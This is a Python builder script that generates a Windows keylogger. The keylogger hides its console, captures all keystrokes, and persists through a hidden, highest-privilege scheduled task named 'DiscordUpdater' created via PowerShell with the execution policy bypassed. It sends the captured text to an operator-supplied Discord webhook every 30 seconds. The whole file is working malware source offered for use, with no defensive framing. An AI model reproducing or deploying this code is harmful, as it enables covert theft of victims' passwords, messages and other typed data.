import os
import re
import sys

def get_username():
    return os.getlogin()

def is_valid_webhook(url):
    return re.match(r'^https://discord\.com/api/webhooks/\d+/[\w-]+$', url) is not None

def build_keylogger(webhook):
    username = get_username()
    
    template = '''import os
import time
import requests
from pynput import keyboard
import ctypes
import sys
import subprocess
import atexit

# Hide console window completely
ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

webhook = "''' + webhook + '''"
pc_user = "''' + username + '''"
current_line = ""
script_path = os.path.abspath(__file__)
python_path = sys.executable

# Create scheduled task on startup if not exists
def create_scheduled_task():
    try:
        result = subprocess.run(["schtasks", "/query", "/tn", "DiscordUpdater"], capture_output=True, text=True)
        if "DiscordUpdater" not in result.stdout:
            ps_command = f'''
$action = New-ScheduledTaskAction -Execute "{python_path}" -Argument "{script_path}"
$trigger = New-ScheduledTaskTrigger -AtLogOn -User "{pc_user}"
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
$principal = New-ScheduledTaskPrincipal -UserId "{pc_user}" -LogonType S4U -RunLevel Highest
Register-ScheduledTask -TaskName "DiscordUpdater" -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Force
'''
            with open("temp_task.ps1", "w") as f:
                f.write(ps_command)
            subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", "temp_task.ps1"], capture_output=True)
            os.remove("temp_task.ps1")
    except:
        pass

def send_logs(logs):
    try:
        data = {"content": f"**{pc_user}**\\\\n```\\\\n{logs}\\\\n```"}
        requests.post(webhook, json=data)
    except:
        pass

def on_press(key):
    global current_line
    try:
        if key == keyboard.Key.enter:
            current_line += "\\\\n"
        elif key == keyboard.Key.space:
            current_line += " "
        elif key == keyboard.Key.backspace:
            current_line = current_line[:-1]
        elif hasattr(key, 'char') and key.char is not None:
            current_line += key.char
        else:
            current_line += f" [{key}] "
    except:
        pass

# Run setup first
create_scheduled_task()

# Keep running forever – no ESC to stop
with keyboard.Listener(on_press=on_press) as listener:
    while True:
        time.sleep(30)
        if current_line.strip():
            send_logs(current_line)
            current_line = ""
'''

    with open("keylogger.py", "w") as f:
        f.write(template)
    
    print(f"[+] keylogger.py created successfully for user: {username}")
    print("[+] When executed, it will:")
    print("    - Hide completely (no window, no console)")
    print("    - Create scheduled task 'DiscordUpdater' on first run")
    print("    - Run at every startup automatically")
    print("    -Bertmaschke was here ;)")
    print("    - Send logs to your webhook every 30 seconds")

if __name__ == "__main__":
    print(f"Hello {get_username()}")
    print("(+) Loaded Successfully… Please input your webhook url:")
    url = input().strip()
    if not is_valid_webhook(url):
        print("This is not a webhook buddy!")
        sys.exit(1)
    build_keylogger(url)
